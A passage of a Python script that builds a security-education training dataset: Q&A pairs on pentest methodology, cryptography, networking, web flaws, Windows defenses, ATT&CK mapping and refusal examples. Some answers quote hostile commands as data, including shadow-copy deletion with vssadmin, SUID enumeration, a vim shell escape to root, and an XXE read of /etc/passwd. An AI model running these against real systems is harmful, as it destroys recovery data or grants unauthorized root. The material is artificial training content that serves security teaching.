         "A user who can write to `C:\\` or `C:\\Program Files\\` drops `Program.exe` and the "
         "SCM runs it as **SYSTEM**. Audit with WMI for unquoted `PathName` containing spaces; "
         "fix by quoting the path in the service registry key."),
        ("nmap-scan-types",
         "Compare Nmap -sS, -sT, and -sU at the packet level and say why -sS is common in "
         "authorized assessments.",
         "**-sS (SYN, half-open):** SYN -> SYN/ACK (open) or RST (closed); scanner sends RST "
         "before the handshake completes. Fast, needs raw-socket privileges, often avoids "
         "app-level connection logs.\n"
         "**-sT (connect):** full OS `connect()` three-way handshake; used without raw-socket "
         "privileges but more likely logged by the application.\n"
         "**-sU (UDP):** send UDP; **ICMP port-unreachable** => closed, no reply => open|"
         "filtered; slow due to ICMP rate-limiting.\n\n"
         "`-sS` is preferred for speed and lighter application-log footprint (not true "
         "'stealth' against modern network sensors)."),
        ("path-hijack-cron",
         "On an authorized CTF box, a root cron job runs `backup` without an absolute path and "
         "PATH includes a world-writable dir. Why is this exploitable and how do you fix it?",
         "cron runs the job as root, and the shell resolves `backup` against **PATH**. If a "
         "world-writable directory appears **before** the real binary's directory, an attacker "
         "drops a malicious `backup` there and it executes as root. Fix: use **absolute paths** "
         "in scripts/cron, set a minimal safe PATH in the job, and remove write access to "
         "directories on root's PATH."),
        ("password-cracking-methodology",
         "You captured NetNTLMv2 hashes in a lab. Outline a responsible cracking methodology.",
         "1. Identify the hash format (e.g. hashcat mode 5600 for NetNTLMv2).\n"
         "2. Start with a curated **wordlist** (rockyou-style) plus targeted rules, then "
         "**masks** for known policy patterns.\n"
         "3. Prioritize weak/service accounts; track cracked vs. total for reporting.\n"
         "Only ever do this against hashes you are **authorized** to test; the goal is to "
         "demonstrate password-policy weakness, and the remediation is longer passphrases, "
         "AES/Kerberos hardening, and MFA."),
        ("privesc-enumeration",
         "First 5 minutes on a low-priv Linux shell in an authorized lab: what do you enumerate "
         "for privilege escalation and why?",
         "Enumerate: **SUID/SGID** binaries (`find / -perm -4000`), **sudo rights** "
         "(`sudo -l`), **writable cron/systemd** units and PATH, **kernel/OS version** vs known "
         "local exploits, and **credentials in files/history/env**. Each maps to a distinct "
         "escalation path (GTFOBins for SUID/sudo, hijacking scheduled jobs, kernel exploits, "
         "reused secrets). Enumerate before exploiting so you pick the lowest-risk path."),
        ("recon-methodology",
         "Explain the difference between passive and active reconnaissance in an authorized "
         "engagement.",
         "**Passive recon** gathers information **without touching the target** — WHOIS/DNS "
         "records, certificate transparency, public code/leaks, search engines — so it's "
         "low-risk and invisible to the target. **Active recon** interacts directly (port/"
         "service scanning, banner grabbing, directory brute-forcing), giving richer data but "
         "generating traffic the target can detect. Start passive to scope, then move to active "
         "within the authorized rules of engagement."),
        ("burp-methodology",
         "Outline a methodical approach to testing a web app for access-control flaws with an "
         "intercepting proxy, in an authorized test.",
         "1. **Map** the app and roles; capture requests for each function.\n"
         "2. **Baseline** what each role can access.\n"
         "3. **Horizontal test:** replay a user's request as another same-level user (swap IDs/"
         "tokens) to find **IDOR**.\n"
         "4. **Vertical test:** replay a privileged request as a low-priv user (and force-browse "
         "admin endpoints) to find missing function-level authorization.\n"
         "Report each with the exact request and the authorization check that was missing."),
        ("xss-to-account",
         "In an authorized test, explain how a stored XSS can lead to account compromise and the "
         "core fix.",
         "A stored XSS payload runs in each victim's browser in the app's origin, so it can read "
         "accessible session data, make authenticated requests as the victim (change email, add "
         "keys), or capture input — effectively account takeover without the password. Core fix: "
         "**context-aware output encoding** + a strict **CSP**, and mark session cookies "
         "`HttpOnly`/`Secure`/`SameSite` so script can't read them."),
        ("pivoting",
         "In an authorized internal test you compromised a dual-homed host. Explain pivoting and "
         "how to do it responsibly.",
         "**Pivoting** uses a foothold host as a relay to reach networks you can't touch "
         "directly (e.g. via SSH port-forwarding or a SOCKS proxy through the host). Do it only "
         "within the **authorized scope**, document every route, avoid disrupting production, "
         "and tear down tunnels afterward. The finding it demonstrates is usually inadequate "
         "**network segmentation** — which is the real remediation."),
        ("report-writing",
         "What makes a penetration-test finding actually useful to the client?",
         "A useful finding states the **risk in business terms**, gives **reproducible steps/"
         "evidence**, rates severity with context (not just CVSS), and provides a **concrete, "
         "prioritized remediation**. Avoid raw tool dumps and fear language. The goal is to help "
         "the team fix the right things first, and to let them verify the fix — not to show off "
         "exploits."),
        ("scope-authorization",
         "Mid-engagement you discover a vulnerable host that is clearly out of the agreed scope. "
         "What do you do?",
         "**Stop and do not touch it.** Testing outside the written scope/authorization is not "
         "permitted regardless of how tempting the target is. Note it, and **contact the client/"
         "point of contact** to decide whether to extend scope in writing. Rules of engagement "
         "exist to keep testing legal and safe; exceeding them can cause outages and legal "
         "liability."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-ctf-{key}", SYS_EDU, prompt, ans,
            task_type="ctf_methodology", domain="offensive_ctf", difficulty="advanced",
            tags=["ctf", "methodology", key],
        )


def _fundamentals_family(dd: _Deduper) -> None:
    scen = [
        ("hash-vs-encrypt",
         "Contrast cryptographic hashing and symmetric encryption; when do you use each?",
         "**Hashing** is a one-way, keyless (or HMAC-keyed) fixed-length digest — used for "
         "integrity (SHA-256), authentication (HMAC), and password storage with a memory-hard "
         "KDF (Argon2id/bcrypt). **Symmetric encryption** is reversible with a shared key — "
         "used for confidentiality (AES-256-GCM at rest, TLS in transit). Use hashing when you "
         "must *verify* without recovering the input; encryption when you must *recover* it.",
         "cryptography"),
        ("pfs",
         "What is Perfect Forward Secrecy in TLS 1.3 and how does it protect recorded traffic?",
         "PFS means compromising the server's **long-term private key does not decrypt past "
         "sessions**. TLS 1.3 uses **ephemeral (EC)DHE** per connection: a fresh session key is "
         "derived and the ephemeral private keys are discarded. The long-term key only "
         "**authenticates** the handshake. So captured ciphertext stays safe even if the "
         "server key later leaks.",
         "cryptography"),
        ("zero-trust",
         "Summarize Zero Trust per NIST SP 800-207.",
         "Zero Trust treats **every** request as untrusted regardless of network location. "
         "Core tenets: **verify explicitly** (identity, device health, context on every "
         "request), **least privilege** (JIT/JEA, adaptive policy), and **assume breach** "
         "(segment, encrypt end-to-end, log and analyze). There is no implicit trust from "
         "being 'inside' the perimeter.",
         "fundamentals"),
        ("cia-triad",
         "Define the CIA triad and give one control per pillar.",
         "**Confidentiality** — data only to authorized parties; control: encryption + RBAC + "
         "MFA. **Integrity** — data not tampered; control: digital signatures / HMAC. "
         "**Availability** — accessible when needed; control: redundancy + DDoS mitigation + "
         "tested backups.",
         "fundamentals"),
        ("pki-revocation",
         "How does PKI certificate validation work, and contrast CRL, OCSP, and OCSP stapling?",
         "The client builds a chain from the leaf through intermediates to a trusted root, and "
         "checks validity dates, hostname (SAN), and key usage. Revocation: **CRL** is a signed "
         "list of revoked serials (large, latency between publishes); **OCSP** is a real-time "
         "query to the CA (latency + privacy leak); **OCSP stapling** has the server fetch and "
         "attach a signed, time-stamped OCSP response in the handshake — no client latency, no "
         "privacy leak.",
         "cryptography"),
        ("symmetric-vs-asymmetric",
         "Contrast symmetric and asymmetric cryptography and how TLS uses both.",
         "**Symmetric** uses one shared key — fast, ideal for bulk data (AES). **Asymmetric** "
         "uses a public/private key pair — slower, ideal for key exchange and signatures "
         "(ECDHE, RSA/ECDSA). TLS combines them: an asymmetric handshake authenticates the "
         "server and establishes a shared secret, then the session switches to **symmetric** "
         "AES for the actual data. You get asymmetric's key distribution with symmetric's speed.",
         "cryptography"),
        ("salting-passwords",
         "Why salt password hashes, and why use bcrypt/Argon2 instead of SHA-256?",
         "A **salt** is a unique random value per password so identical passwords hash "
         "differently — defeating precomputed **rainbow tables** and revealing reuse. But a fast "
         "hash like SHA-256 lets an attacker try billions of guesses/sec on stolen hashes. "
         "**bcrypt/Argon2** are deliberately **slow and memory-hard** with a tunable work "
         "factor, so offline cracking is orders of magnitude harder even with the salt known.",
         "cryptography"),
        ("defense-in-depth",
         "Explain defense in depth with a concrete layered example.",
         "Defense in depth layers independent controls so one failure isn't fatal. Example for "
         "a web app: WAF + input validation (perimeter), least-privilege app/DB accounts and "
         "parameterized queries (app), network segmentation and egress filtering (network), MFA "
         "and RBAC (identity), and logging/EDR + tested backups (detection & recovery). An "
         "attacker must defeat several distinct controls, and each layer buys detection time.",
         "fundamentals"),
        ("authn-vs-authz",
         "Distinguish authentication from authorization with an example.",
         "**Authentication** proves *who* you are (password + MFA at login). **Authorization** "
         "decides *what* you may do once identified (RBAC says this user can read but not delete). "
         "They're independent: a correctly authenticated user must still be authorized per "
         "request. Many breaches are **broken authorization** (IDOR, missing function-level "
         "checks) on top of perfectly good authentication.",
         "fundamentals"),
        ("mac-vs-hmac",
         "What does an HMAC provide that a plain hash does not?",
         "A plain hash gives **integrity** but anyone can recompute it, so it doesn't prove "
         "*origin*. An **HMAC** mixes a **secret key** into the hash, so only parties with the "
         "key can produce or verify it — giving integrity **and** authenticity, and resisting "
         "length-extension. Use HMAC (e.g. HMAC-SHA256) to authenticate messages/tokens, not a "
         "bare hash.",
         "cryptography"),
        ("key-exchange-dh",
         "How does Diffie-Hellman let two parties agree on a secret over a public channel?",
         "Each party picks a private value and sends a public value derived from it (g^a, g^b "
         "mod p, or an EC equivalent). Each combines their private value with the other's public "
         "value to compute the same shared secret (g^ab), which an eavesdropper cannot derive "
         "from the public values alone (the discrete-log problem). DH provides key agreement but "
         "**not authentication** — it must be signed/authenticated to prevent MitM.",
         "cryptography"),
        ("nonce-iv",
         "Why must you never reuse a nonce/IV with the same key in AES-GCM?",
         "AES-GCM's security depends on a **unique nonce per key**. Reusing a nonce with the "
         "same key lets an attacker XOR ciphertexts to leak plaintext relationships **and**, "
         "worse, recover the GCM authentication subkey — enabling forgery of valid ciphertexts. "
         "Use a random 96-bit nonce or a counter that never repeats, and rotate keys before the "
         "nonce space is exhausted.",
         "cryptography"),
        ("encrypt-then-mac",
         "Why is authenticated encryption (or encrypt-then-MAC) preferred over encryption alone?",
         "Encryption alone gives **confidentiality but not integrity**: an attacker can flip or "
         "splice ciphertext, and padding-oracle-style attacks can even recover plaintext. "
         "**Authenticated encryption** (AES-GCM, ChaCha20-Poly1305) or **encrypt-then-MAC** adds "
         "an integrity tag verified before decryption, so tampered ciphertext is rejected. "
         "Prefer a vetted AEAD mode over rolling your own compose order.",
         "cryptography"),
        ("tls-cert-validation",
         "What must a client verify about a server's TLS certificate, beyond that it decrypts?",
         "The client must verify the certificate **chains to a trusted root**, is **within its "
         "validity dates**, is **not revoked** (OCSP/CRL), and — crucially — that the **hostname "
         "matches the SAN**. Skipping hostname verification is a common bug that silently enables "
         "man-in-the-middle even though the connection is 'encrypted'. Encryption without "
         "authentication of the peer is not secure.",
         "cryptography"),
        ("password-storage",
         "Design correct password storage for a web app.",
         "Never store plaintext or fast hashes. Use a **memory-hard KDF** — **Argon2id** "
         "(or scrypt/bcrypt) — with a **unique per-user salt** (built in) and a tuned work "
         "factor. Optionally add a server-side **pepper** kept in a secret store. Enforce "
         "length-based passphrase policy, rate-limit and lock out guessing, and offer MFA. On "
         "login, compare using the KDF's constant-time verify.",
         "cryptography"),
    ]
    for key, prompt, ans, cat in scen:
        dd.add(
            f"train-fund-{key}", SYS_FUND, prompt, ans,
            task_type="cryptography" if cat == "cryptography" else "fundamentals",
            domain="general", difficulty="intermediate", requires_evidence=False,
            tags=["fundamentals", cat, key],
        )


def _network_family(dd: _Deduper) -> None:
    scen = [
        ("tls13-handshake",
         "Summarize the TLS 1.3 handshake and one security improvement over TLS 1.2.",
         "TLS 1.3: ClientHello (with key share) -> ServerHello + key share, the server "
         "authenticates and both derive keys via **(EC)DHE**, then encrypted Finished — one "
         "round trip. Improvement: it **removes static-RSA key exchange and weak ciphers**, so "
         "**forward secrecy is mandatory**, and most of the handshake is encrypted."),
        ("kerberos-flow",
         "Walk through normal Kerberos authentication (AS/TGS/AP exchanges).",
         "1. **AS-REQ/AS-REP:** client proves knowledge of its key (pre-auth) and gets a "
         "**TGT** encrypted with the **krbtgt** key.\n"
         "2. **TGS-REQ/TGS-REP:** client presents the TGT to request a **service ticket (TGS)** "
         "for a specific SPN.\n"
         "3. **AP-REQ:** client presents the service ticket to the service, which validates it "
         "with its own key. The KDC never sees the service password; tickets are key-encrypted, "
         "not password-carrying."),
        ("arp-spoofing",
         "Explain ARP spoofing and a practical mitigation.",
         "ARP has no authentication, so an attacker on the LAN sends forged ARP replies mapping "
         "the gateway's IP to the attacker's MAC, causing hosts to send traffic through the "
         "attacker (AiTM). Mitigate with **Dynamic ARP Inspection** (tied to DHCP snooping) on "
         "managed switches, and static ARP for critical hosts."),
        ("tcp-handshake",
         "Describe the TCP three-way handshake and what a SYN flood abuses.",
         "**Handshake:** client SYN -> server SYN-ACK -> client ACK, establishing sequence "
         "numbers and connection state. A **SYN flood** sends many SYNs without the final ACK, "
         "filling the server's half-open connection backlog so legitimate clients can't connect. "
         "**SYN cookies** defend by encoding state in the SYN-ACK sequence number so no memory "
         "is allocated until the client's ACK arrives."),
        ("dns-resolution",
         "Walk through recursive DNS resolution and name one security hardening.",
         "A stub resolver asks a **recursive resolver**, which (if uncached) queries the **root** "
         "-> **TLD** -> **authoritative** servers, then caches and returns the answer. Because "
         "classic DNS is unauthenticated and cleartext, hardening options include **DNSSEC** "
         "(origin authentication/integrity of records) and **DNS over TLS/HTTPS** "
         "(confidentiality of the query)."),
        ("vpn-ipsec-vs-tls",
         "Contrast IPsec and TLS VPNs at a high level.",
         "**IPsec** operates at the network layer (ESP/AH with IKE key exchange), tunneling all "
         "IP traffic — common for site-to-site. **TLS/SSL VPNs** operate at the transport/"
         "application layer over TCP/UDP 443, are easier through firewalls/NAT, and often used "
         "for remote-access clients. Both provide confidentiality/integrity; the choice is about "
         "layer, deployment, and firewall traversal."),
        ("firewall-stateful",
         "What does a stateful firewall track that a stateless ACL does not?",
         "A **stateful** firewall tracks the **connection state** (a table of established flows), "
         "so it can automatically permit return traffic for a connection it allowed outbound and "
         "drop packets that don't belong to a known flow. A **stateless** ACL evaluates each "
         "packet in isolation against rules, so you must explicitly permit both directions and it "
         "can't reason about connection context."),
        ("nat-vs-security",
         "Is NAT a security control? Explain.",
         "NAT (address translation) is primarily about **address conservation/reachability**, "
         "not security. It incidentally hides internal addressing and blocks unsolicited inbound "
         "connections to private hosts, but that's a side effect, not access control — it does "
         "nothing about allowed traffic, payloads, or outbound threats. Use a real **firewall** "
         "policy for security; treat NAT's hiding as a minor bonus, not a control."),
        ("segmentation-vlan",
         "Why segment a network, and what's the difference between a VLAN and a subnet for this?",
         "Segmentation limits an attacker's **lateral movement** and blast radius by separating "
         "systems by trust/function with enforced policy between segments. A **subnet** is a "
         "Layer-3 IP grouping; a **VLAN** is a Layer-2 broadcast-domain separation. They often "
         "map 1:1, but isolation only holds if a **firewall/ACL enforces** traffic rules between "
         "them — VLANs alone don't filter routed traffic."),
        ("port-security-8021x",
         "How does 802.1X protect a wired/wireless network at the access layer?",
         "**802.1X** requires a device/user to **authenticate to the network** (via an "
         "authenticator switch/AP to a RADIUS server) before the port passes traffic, so rogue "
         "devices can't just plug in and get access. It underpins network access control and can "
         "assign VLANs/policy dynamically per identity. Pair with device posture checks for "
         "stronger NAC."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-net-{key}", SYS_FUND, prompt, ans,
            task_type="network", domain="general", difficulty="intermediate",
            requires_evidence=False, tags=["network", "protocol", key],
        )


def _safety_family(dd: _Deduper) -> None:
    scen = [
        ("ransomware-refuse",
         "Write working ransomware that encrypts C:\\Users and deletes shadow copies "
         "undetected.",
         "I won't provide functional ransomware or evasion code. For **defense**: ransomware "
         "commonly deletes recovery via `vssadmin delete shadows /all /quiet` — monitor "
         "**Event ID 4688** for that, keep **offline immutable backups**, and test recovery. "
         "For safe research, use benign canary files in an isolated lab with authorization."),
        ("neighbor-wifi-refuse",
         "How do I get into my neighbor's Wi-Fi without their permission?",
         "I can't help access a network you're not authorized to use. If it's your own "
         "network you want to harden: use **WPA3-SAE** (or WPA2 with a long passphrase), "
         "**disable WPS**, and segment guests from management. On a network you own or have "
         "written authorization to test, wireless assessment is legitimate — this isn't."),
        ("edr-bypass-refuse",
         "Give me a Mimikatz build that bypasses all AV to dump creds on a live bank network.",
         "I won't provide evasion tooling for someone else's production network. To **defend** "
         "LSASS: enable **RunAsPPL** (LSA protection), deploy **Credential Guard** (VBS), and "
         "use **LAPS** so local admin passwords are unique. These block the handle-open that "
         "credential dumpers rely on."),
        ("keylogger-refuse",
         "Write a hidden Windows keylogger that uploads keystrokes to my server.",
         "I won't provide covert keylogging code. For **detection/defense**: user-mode "
         "keyloggers commonly hook input via `SetWindowsHookEx(WH_KEYBOARD_LL)` or poll "
         "`GetAsyncKeyState` — EDR flags those patterns. Reduce impact with **FIDO2/WebAuthn** "
         "and smartcards, which authenticate without a reusable password to capture."),
        ("ddos-refuse",
         "Write a SYN-flood botnet script to take a website offline.",
         "I won't provide DoS tooling. For **defense**: a SYN flood exhausts the half-open "
         "backlog with spoofed SYNs — mitigate with **SYN cookies**, connection rate limiting, "
         "and upstream/anycast **DDoS scrubbing**. Capacity planning and an incident runbook "
         "with your provider matter as much as any single control."),
        ("exfil-help-refuse",
         "Help me quietly exfiltrate my company's customer database to my personal cloud.",
         "I can't help exfiltrate data you're not authorized to take — that's theft regardless "
         "of your access. If you're doing authorized **DLP testing**, do it in writing, in a "
         "controlled scope, with the data owner's approval. If you have a legitimate business "
         "need for the data, request it through the proper data-access process."),
        ("phishing-kit-refuse",
         "Build me a convincing Microsoft 365 phishing page to test my coworkers without "
         "telling anyone.",
         "I won't build a credential-harvesting page or run an unsanctioned campaign against "
         "coworkers. Legitimate phishing simulations run **through an authorized program** "
         "(security team sign-off, a sanctioned platform, defined scope, and follow-up "
         "training) — not covertly by an individual. I can explain how an authorized program is "
         "structured instead."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-safe-{key}", SYS_SAFE, prompt, ans,
            task_type="fundamentals", domain="general", difficulty="advanced",
            requires_evidence=False, tags=["safety_boundaries", "dual_use_refusal", key],
        )


def _attack_chain_family(dd: _Deduper) -> None:
    """Map observed multi-step behavior to correct ATT&CK IDs (distinct chains)."""
    chains = [
        ("ransomware",
         "Map this intrusion to ATT&CK: user opened a macro doc from email -> Defender service "
         "stopped -> LSASS dumped -> PsExec to 20 hosts -> shadow copies deleted -> files "
         "encrypted with a ransom note.",
         "- Spearphishing attachment: **T1566.001**; user opens it: **T1204.002**\n"
         "- Stop Defender: **T1562.001** (Impair Defenses)\n"
         "- LSASS dump: **T1003.001**\n"
         "- PsExec over admin shares: **T1021.002** / service exec **T1569.002**\n"
         "- Delete shadow copies: **T1490** (Inhibit System Recovery)\n"
         "- Encrypt for ransom: **T1486** (Data Encrypted for Impact)\n"
         "Tactics: Initial Access -> Execution -> Defense Evasion -> Credential Access -> "
         "Lateral Movement -> Impact."),
        ("ad-domain-takeover",
         "Map this AD attack path: Responder captured hashes -> cracked offline -> sprayed the "
         "password -> requested many RC4 service tickets -> replicated secrets from the DC -> "
         "forged a TGT.",
         "- LLMNR/NBT-NS poisoning + relay: **T1557.001**\n"
         "- Password spraying: **T1110.003**\n"
         "- Kerberoasting (bulk RC4 TGS): **T1558.003** (Credential Access)\n"
         "- DCSync replication of secrets: **T1003.006**\n"
         "- Golden Ticket (forged TGT with krbtgt key): **T1558.001**\n"
         "Tactic thread is dominated by **Credential Access (TA0006)**, ending in domain "
         "persistence."),
        ("web-to-c2",
         "Map this: attacker exploited an internet-facing app, beaconed over HTTPS, pulled down "
         "a second-stage tool, elevated with a token trick, then exfiltrated over the same "
         "channel.",
         "- Exploit public-facing app: **T1190**\n"
         "- C2 over web protocols: **T1071.001**\n"
         "- Ingress tool transfer: **T1105**\n"
         "- Access token manipulation: **T1134**\n"
         "- Exfiltration over C2 channel: **T1041**\n"
         "Tactics: Initial Access -> Command and Control -> Privilege Escalation -> "
         "Exfiltration."),
        ("lolbin-persistence",
         "Map this: certutil fetched a payload, rundll32 ran it, a scheduled task was created "
         "for persistence, and the actor moved by RDP.",
         "- certutil download (ingress): **T1105**\n"
         "- rundll32 proxy execution: **T1218.011**\n"
         "- Scheduled task persistence: **T1053.005**\n"
         "- Lateral movement via RDP: **T1021.001** (Remote Desktop Protocol)\n"
         "Tactics: Command and Control -> Defense Evasion/Execution -> Persistence -> Lateral "
         "Movement."),
        ("cloud-identity",
         "Map this cloud intrusion: phishing link harvested creds -> logged in with them -> "
         "created a new access key -> attached admin -> copied data to external object storage.",
         "- Spearphishing link: **T1566.002**\n"
         "- Valid accounts: **T1078**\n"
         "- Account manipulation (new key + admin): **T1098**\n"
         "- Exfiltration to cloud storage: **T1567.002**\n"
         "Tactics: Initial Access -> Defense Evasion/Persistence -> Exfiltration."),
    ]
    for key, prompt, ans in chains:
        dd.add(
            f"train-attack-chain-{key}", SYS_ATTACK, prompt, ans,
            task_type="attack_mapping", domain="blue_team", difficulty="advanced",
            requires_evidence=False, tags=["attack_mapping", "chain", key],
        )


def _web_family(dd: _Deduper) -> None:
    scen = [
        ("sqli-parameterized",
         "Why do parameterized queries stop SQL injection when input escaping often fails?",
         "Parameterized queries send the SQL text and the data on **separate channels**: the "
         "query is parsed and planned first, then values are bound as literals that can never "
         "change the statement's structure. Escaping tries to sanitize data *inside* the SQL "
         "string, which fails against edge cases (encodings, second-order input, numeric "
         "contexts). Binding removes the mixing of code and data entirely."),
        ("stored-vs-reflected-xss",
         "Contrast stored and reflected XSS and give the primary defense.",
         "**Reflected XSS** echoes attacker input from the request straight back into the "
         "response (needs a crafted link/victim interaction). **Stored XSS** persists the "
         "payload server-side (e.g. a comment) so it executes for every viewer — higher impact. "
         "Primary defense for both: **context-aware output encoding**, plus a strict "
         "**Content-Security-Policy** and input validation as defense in depth."),
        ("csrf-samesite",
         "How does CSRF work and how do anti-CSRF tokens and SameSite cookies stop it?",
         "CSRF abuses the browser automatically attaching a victim's session cookie to a "
         "forged cross-site request. An **anti-CSRF token** is a per-session secret the "
         "attacker's site can't read or predict, required on state-changing requests. "
         "**SameSite=Lax/Strict** cookies tell the browser not to send the session cookie on "
         "cross-site requests, cutting off the automatic-credential premise."),
        ("idor",
         "What is IDOR and why doesn't hiding the ID fix it?",
         "Insecure Direct Object Reference: the app uses a client-supplied identifier (e.g. "
         "`/invoice?id=123`) to fetch an object **without checking the requester is authorized** "
         "for it, so changing the ID exposes others' data. Hiding or obfuscating the ID is "
         "security-by-obscurity; the fix is a server-side **authorization check** that the "
         "current principal owns/may access the object."),
        ("ssti",
         "What is Server-Side Template Injection and why is it dangerous?",
         "SSTI occurs when user input is concatenated into a server-side template that is then "
         "evaluated (e.g. Jinja2 `{{...}}`, Freemarker), so the attacker's input is executed as "
         "template code. Because templates can reach language objects, SSTI frequently escalates "
         "to **remote code execution**. Fix: never render user input as a template; pass it as "
         "sandboxed **data** to a fixed template, and use a logic-less/auto-escaping engine."),
        ("jwt-alg-none",
         "Explain the JWT 'alg:none' / algorithm-confusion flaw and the fix.",
         "If a backend trusts the token's own `alg` header, an attacker sets **`alg:none`** "
         "(no signature) or swaps **RS256->HS256** so the RSA *public* key is used as an HMAC "
         "secret, forging valid tokens. Fix: **pin the expected algorithm(s) server-side** and "
         "reject anything else; never let the token dictate its verification algorithm; validate "
         "issuer/audience/expiry."),
        ("cors-misconfig",
         "How does a permissive CORS policy become a vulnerability?",
         "Reflecting the request `Origin` into `Access-Control-Allow-Origin` **and** setting "
         "`Access-Control-Allow-Credentials: true` lets *any* site make authenticated cross-"
         "origin requests and read the responses — leaking user data. Fix: allow only a strict "
         "allowlist of trusted origins, never reflect arbitrary origins with credentials, and "
         "avoid `*` for authenticated endpoints."),
        ("file-upload-rce",
         "How can a file-upload feature lead to RCE, and how do you harden it?",
         "If the app stores an uploaded file in a web-served directory and the server will "
         "**execute** it (e.g. a `.php`/`.jsp`), the attacker uploads a web shell and runs code. "
         "Harden: validate type by content not just extension, **store uploads outside the "
         "webroot** in non-executable storage, randomize filenames, serve via a handler that "
         "never executes, and scan/limit size."),
        ("open-redirect",
         "Why are open redirects a real risk despite 'just' redirecting?",
         "An open redirect (`/go?url=`) that sends users to an attacker-controlled site enables "
         "convincing **phishing** (the link starts on your trusted domain) and can bypass "
         "allowlists in OAuth `redirect_uri` flows to steal tokens. Fix: redirect only to a "
         "server-side allowlist of paths/hosts, or use indirection (map an ID to a known URL) "
         "rather than reflecting a user-supplied URL."),
        ("xxe",
         "What is XXE and what's the core defense?",
         "XML External Entity injection: an XML parser that resolves external entities lets an "
         "attacker read local files (`file:///etc/passwd`), perform SSRF, or cause DoS via "
         "entity expansion. Core defense: **disable external entities and DTD processing** in "
         "the parser (secure defaults), and prefer safer formats (JSON) where possible."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-web-{key}", SYS_EDU, prompt, ans,
            task_type="web_security", domain="general", difficulty="intermediate",
            requires_evidence=False, tags=["web_security", key],
        )


def _windows_family(dd: _Deduper) -> None:
    scen = [
        ("logon-types",
         "Explain Windows Logon Types 2, 3, and 10 and why they matter in triage.",
         "**Type 2 (Interactive):** at the console/keyboard. **Type 3 (Network):** accessing a "
         "resource over the network (SMB, IIS, RPC) with no desktop — the most common in "
         "lateral movement. **Type 10 (RemoteInteractive):** RDP. In triage the type tells you "
         "*how* the account was used: a service account showing Type 10 (interactive RDP) is "
         "abnormal and worth investigating."),
        ("4624-4625-4672",
         "What do Event IDs 4624, 4625, and 4672 mean together?",
         "**4624** = successful logon, **4625** = failed logon, **4672** = special privileges "
         "assigned at logon (admin-equivalent rights). A burst of 4625 then a 4624 is a "
         "successful guess; a 4624 immediately followed by **4672** means the account logged on "
         "*with administrative privileges* — useful for spotting privileged logons to hunt."),
        ("amsi-scriptblock",
         "How do AMSI and PowerShell script-block logging help detect malicious PowerShell?",
         "**Script-block logging (Event ID 4104)** records the actual (de-obfuscated at "
         "execution) script content, so `-EncodedCommand` payloads are captured in cleartext. "
         "**AMSI** lets AV/EDR scan script content at runtime, after in-memory de-obfuscation, "
         "before execution. Together they defeat simple base64/`-enc` evasion that would hide "
         "from command-line logging alone."),
        ("lsa-protection",
         "What are RunAsPPL and Credential Guard, and what attack do they blunt?",
         "**RunAsPPL** marks LSASS as a Protected Process Light so non-protected processes can't "
         "open a read handle to it. **Credential Guard** uses virtualization-based security to "
         "isolate NTLM/Kerberos secrets from the normal LSASS address space. Both blunt "
         "**LSASS credential dumping (T1003.001)** — the dumper can't read the secrets even as "
         "admin."),
        ("uac-integrity",
         "Explain Windows UAC and integrity levels, and why 'UAC bypass' is not a vulnerability "
         "exploit.",
         "Windows assigns processes **integrity levels** (Low/Medium/High/System). A standard "
         "admin runs at **Medium** until UAC elevates to **High**. A **UAC bypass** abuses a "
         "built-in auto-elevating binary/COM object to reach High without a prompt — it abuses a "
         "*feature*, mapping to **T1548.002**, and is distinct from **T1068** (exploiting a "
         "software vulnerability). Mitigate by setting UAC to always prompt and limiting admin "
         "rights."),
        ("smb-signing",
         "What does SMB signing do and which attack does it stop?",
         "SMB signing cryptographically signs each SMB message so a man-in-the-middle can't "
         "tamper with or **relay** the session. Enforcing SMB signing (especially on DCs and "
         "servers) defeats **NTLM relay** attacks (part of T1557.001) where captured "
         "authentication is forwarded to another host. Pair it with disabling LLMNR/NBT-NS."),
        ("applocker-wdac",
         "Contrast AppLocker and WDAC as application control.",
         "**AppLocker** allows/denies executables/scripts by path, publisher, or hash via Group "
         "Policy — easier to deploy but bypassable (e.g. writable allowed paths, LOLBins). "
         "**WDAC** (Windows Defender Application Control) enforces a kernel-level code-integrity "
         "policy that is stronger and harder to bypass but more work to build/maintain. Use WDAC "
         "for high-assurance systems; AppLocker for broad, lower-friction coverage."),
        ("laps",
         "What problem does LAPS solve and why does it slow lateral movement?",
         "**LAPS** gives every machine a **unique, randomized local administrator password** "
         "that rotates automatically and is stored/ACL'd in AD. That breaks **local-admin "
         "password reuse** — the property that lets an attacker who dumps one host's local admin "
         "hash pass it to every other host (pass-the-hash lateral movement). With LAPS, each "
         "host's local admin secret is different and useless elsewhere."),
        ("appguard-asr",
         "What is Windows Defender Application Guard vs. an attack-surface-reduction rule? Keep "
         "it brief.",
         "**Application Guard** isolates untrusted Office/Edge content in a lightweight hardware-"
         "virtualized container so malware can't touch the host. **Attack Surface Reduction "
         "(ASR) rules** are Defender policies that block risky behaviors (e.g. Office spawning "
         "child processes, credential theft from LSASS). Guard *isolates*; ASR *blocks specific "
         "techniques* — use both as layers."),
        ("event-forwarding",
         "Why configure Windows Event Forwarding to a central collector?",
         "**WEF** ships security events to a central collector so logs survive **local log "
         "clearing** (Event 1102), enable cross-host correlation, and feed a SIEM without an "
         "agent on every box. An attacker who clears a host's local logs can't erase what was "
         "already forwarded — which is why forwarding is a key anti-anti-forensics control."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-win-{key}", SYS_AD, prompt, ans,
            task_type="windows_security", domain="blue_team", difficulty="intermediate",
            requires_evidence=False, tags=["windows_security", key],
        )


def _privesc_family(dd: _Deduper) -> None:
    scen = [
        ("linux-sudo-gtfobins",
         "`sudo -l` shows a user may run `/usr/bin/vim` as root. Why is that a privilege-"
         "escalation risk?",
         "`vim` can spawn a shell (`:!/bin/sh` or `:py`), so running it as root via sudo yields "
         "a **root shell** — a GTFOBins-style abuse of a legitimate binary. The lesson: granting "
         "sudo to any program that can execute arbitrary commands is equivalent to granting full "
         "root. Restrict sudo to specific, non-shell-spawning commands, and audit sudoers."),
        ("windows-seimpersonate",
         "A service account has the SeImpersonatePrivilege. Why does that matter for privilege "
         "escalation?",
         "`SeImpersonatePrivilege` lets a process impersonate a client's token. Service accounts "
         "with it (e.g. IIS/MSSQL) are targeted by 'Potato'-style attacks that coerce a SYSTEM "
